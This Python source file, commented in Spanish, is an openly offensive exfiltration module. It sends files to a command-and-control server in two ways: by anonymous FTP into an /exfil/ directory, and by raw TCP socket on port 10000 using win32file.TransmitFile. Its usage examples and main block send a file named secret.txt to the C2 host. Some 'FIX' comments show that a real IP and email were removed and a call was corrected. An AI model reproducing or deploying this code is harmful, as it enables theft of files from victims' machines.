"""
transmit_exfil.py - Exfiltración por FTP y socket con TransmitFile
====================================================================
Proporciona dos mecanismos de transferencia de ficheros a un servidor C2:
  - plain_ftp():  sube el fichero por FTP anónimo.
  - transmit():   transfiere el fichero por socket raw usando la función
                  win32file.TransmitFile (zero-copy, solo Windows).

REQUISITOS:
    pip install pywin32   # win32file, solo Windows

EJEMPLOS DE EJECUCIÓN:
    # FTP:
    C2_HOST=192.168.1.200 python transmit_exfil.py

    # Socket:
    C2_HOST=192.168.1.200 python -c "from transmit_exfil import transmit; transmit('./secret.txt')"
"""

import ftplib
import os
import socket

import win32file  # Solo Windows

# -------------------------------------------------------------------
# Configuración — leer desde variables de entorno
# -------------------------------------------------------------------
C2_HOST = os.environ.get('C2_HOST', '192.168.0.1')   # FIX: IP real reemplazada


def plain_ftp(docpath, server=None):
    """
    Sube `docpath` al servidor FTP usando login anónimo.

    Args:
        docpath (str): Ruta local del fichero a subir.
        server  (str): IP/hostname del servidor FTP (por defecto C2_HOST).
    """
    if server is None:
        server = C2_HOST
    ftp = ftplib.FTP(server)
    ftp.login('anonymous', 'anon@example.com')   # FIX: email personal eliminado
    ftp.cwd('/exfil/')
    with open(docpath, 'rb') as f:
        ftp.storbinary(f'STOR {os.path.basename(docpath)}', f, 1024)
    ftp.quit()


def transmit(document_path):
    """
    Transfiere `document_path` al servidor C2 mediante un socket TCP
    usando win32file.TransmitFile (transferencia en modo kernel, Windows).

    Args:
        document_path (str): Ruta local del fichero a enviar.
    """
    sock = socket.socket()
    sock.connect((C2_HOST, 10000))
    with open(document_path, 'rb') as f:
        # FIX: `client.win32file._get_osfhandle(...)` →
        #       `win32file.get_osfhandle(...)` (función del módulo)
        win32file.TransmitFile(
            sock,
            win32file.get_osfhandle(f.fileno()),
            0, 0, None, 0, b'', b''
        )
    sock.close()


if __name__ == '__main__':
    transmit('./secret.txt')
